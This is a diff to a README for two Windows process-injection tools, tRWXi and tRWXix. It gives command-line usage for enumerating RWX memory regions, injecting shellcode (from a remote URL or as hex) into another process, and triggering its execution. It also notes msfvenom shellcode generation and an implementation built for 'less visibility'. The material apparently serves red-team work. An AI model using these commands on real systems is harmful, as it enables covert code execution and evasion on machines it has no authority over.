@@ -10,33 +10,44 @@ For a more stealthy mode, see the implementation of the **tRWXix.exe** tool desc
 
 ### Usage
 ```
-.\tRWXi.exe /enumerate                                          ---> conduct an enumeration
-.\tRWXi.exe /inject  /pid=<pid> /url=<remote shell code>        ---> inject a shellcode into the RWX region of a particular process
-.\tRWXi.exe /trigger /pid=<pid> /address=<hex address>          ---> trigger an execution of a shellcode in particular memory address (see description of tRWXix.exe)
+Usage:
+        .\tRWXi.exe /enumerate                                                              --> only enumerate
+        .\tRWXi.exe /inject  /pid=<pid> /address=<hex address> /url=<remote shell code>     --> inject a shellcode from remote source into the RWX region 
+        .\tRWXi.exe /inject  /pid=<pid> /address=<hex address> /data=<hex code>             --> inject a shellcode as a parameter into the RWX region
+        .\tRWXi.exe /read    /pid=<pid> /address=<hex address> /size=<size>                 --> read a content of memory address
+        .\tRWXi.exe /trigger /pid=<pid> /address=<hex address>                              --> trigger code execution from a memory address
 ```
 
 ### Example
-- Enumerate the RWX memory regions in all processes that the current user can access:
-![RWX enumeration](./_readme.d/01-injector-3.png)
-- Inject a shellcode into the RWX region of a particular process and trigger it:
-![shellcode_injection](./_readme.d/01-injector-4.png)
 - Generate a shellcode in a numeric format (msfvenom -f num):
 ![shellcode_format](./_readme.d/01-injector-2.png)
+- Enumerate the RWX memory regions in all processes that the current user can access:
+![RWX enumeration](./_readme.d/01-injector-3.png)
+- Inject a shellcode into the RWX region (address:0x1CD1F910000) of the powershell process (PID:6772) and trigger it:
+![shellcode_injection](./_readme.d/01-injector-4.png)
 
 # tRWXix
 
-An utility for triggering a shellcode in a RWX region
+tRWXi functionality w/ NtApiDotNet library
 
 ### Description
-Imagine, you have found a way to overwrite an ExecuteReadWrite memory region of a particular process, and now all you need to do is trigger it. This utility does exactly this. 
-
-Please refer to our blog article <link follows> where we describe how to modify RWX regions if the first part is still confusing for you.  
+Same functionality as of **tRWXi**.\
+Pure **NtApiDotNet** implementation for less visibility.
 
 ### Usage
 ```
-.\tRWXix.exe /trigger /pid=<pid> /address=<hex address>
+Usage:
+        .\tRWXi.exe /enumerate                                                              --> only enumerate
+        .\tRWXi.exe /inject  /pid=<pid> /address=<hex address> /url=<remote shell code>     --> inject a shellcode from remote source into the RWX region 
+        .\tRWXi.exe /inject  /pid=<pid> /address=<hex address> /data=<hex code>             --> inject a shellcode as a parameter into the RWX region
+        .\tRWXi.exe /read    /pid=<pid> /address=<hex address> /size=<size>                 --> read a content of memory address
+        .\tRWXi.exe /trigger /pid=<pid> /address=<hex address>                              --> trigger code execution from a memory address
 ```
 
 ### Example
-- Trigger an execution of a shellcode from the particular RWX memory region:
-![shellcode_trigger](./_readme.d/02-trigger-1.png)
+- Inject the shellcode in a process from a remote web server and trigger its execution:
+![shellcode_format](./_readme.d/02-injector-1.png)
+- Read the modified address:
+![RWX enumeration](./_readme.d/02-injector-2.png)
+- Trigger the memory region w/ a shellcode inside it
+![RWX enumeration](./_readme.d/02-injector-3.png)
